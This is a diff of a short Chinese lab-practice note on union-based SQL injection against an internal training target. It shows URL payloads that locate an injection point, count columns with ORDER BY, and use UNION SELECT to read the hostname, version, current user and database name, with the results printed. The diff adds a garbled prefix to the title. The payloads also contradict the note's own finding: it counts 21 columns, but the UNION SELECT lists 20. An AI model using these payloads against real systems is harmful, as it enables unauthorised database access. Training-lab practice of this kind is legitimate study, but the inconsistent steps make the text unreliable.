@@ -1,4 +1,4 @@
-内网靶场练习：
+-_-\.内网靶场练习：
 
 构造 “http://..30.11:90/sec_show.php?cid=1&aid=1 ”判断注入点 id=-1 报错，有注入 构造“http://..30.11:90/sec_show.php?cid=1&aid=1 order by 21 ” order by 猜字段，一个个试出来，order by 22 报错 order by 21成功 共有21个字段 http://..30.11:90/sec_show.php?cid=1&aid=-1 union select 1,2,@@hostname,version(),5,user(),7,8,9,10,11,12,13,14,15,16,17,18,19,20 查看目标电脑用户名:@@hostname SQLInjection1 查看版本:version() 5.6.12-log 查询当前用户:user() root@127.0.0.1 数据库：database() sqlinj_1
 
